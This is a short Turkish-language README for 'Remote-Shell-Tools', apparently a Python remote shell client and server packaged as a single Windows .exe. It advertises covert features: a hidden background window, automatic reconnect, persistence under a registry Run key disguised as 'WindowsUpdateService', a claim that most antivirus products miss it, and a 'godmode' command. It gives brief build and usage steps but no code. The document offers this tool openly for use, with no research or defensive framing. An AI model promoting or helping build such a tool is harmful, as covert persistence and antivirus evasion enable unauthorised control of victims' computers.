Remote-Shell-Tools

## Özellikler
- Otomatik reconnect (bağlantı kopsa bile geri gelir)
- Türkçe karakter desteği (dir, whoami, ipconfig… hepsi sorunsuz)
- 15+ hazır komut (`msg`, `godmode`, `netstat -ano`, `getmac`, `trash` vs)
- Windows 11’de test edilmiş ultra sessiz persistence  
  → `HKCU\Run\WindowsUpdateService` (antivirüslerin %95’i yemiyor)
- Pencere açmadan arka planda çalışır
- Admin gerekmez (persistence ve tüm komutlar normal kullanıcıyla çalışır)
- Tek dosya, tek .exe (pyinstaller ile kolayca derlenir)
#Kullanım
önce Shell_server.py yi çalıştırın
sonrada Shell_client.py(istemci) bu ise exe haline getireceğiniz kısımdır
